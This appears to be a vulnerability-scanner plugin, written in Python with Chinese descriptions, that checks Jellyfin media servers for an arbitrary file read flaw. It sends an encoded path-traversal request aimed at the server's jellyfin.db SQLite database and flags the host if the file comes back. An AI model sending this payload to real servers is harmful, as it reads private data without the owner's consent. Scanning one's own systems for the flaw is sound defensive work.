# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Jellyfin 任意文件读取漏洞",
        "description": "jellyfin 是一个自由的软件媒体系统，用于控制和管理媒体和流媒体",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db',
            timeout=15
        )
        if r.status_code == 200 and 'SQLite' in r.text:
            return {"LoopholeInfo": self.__info__}
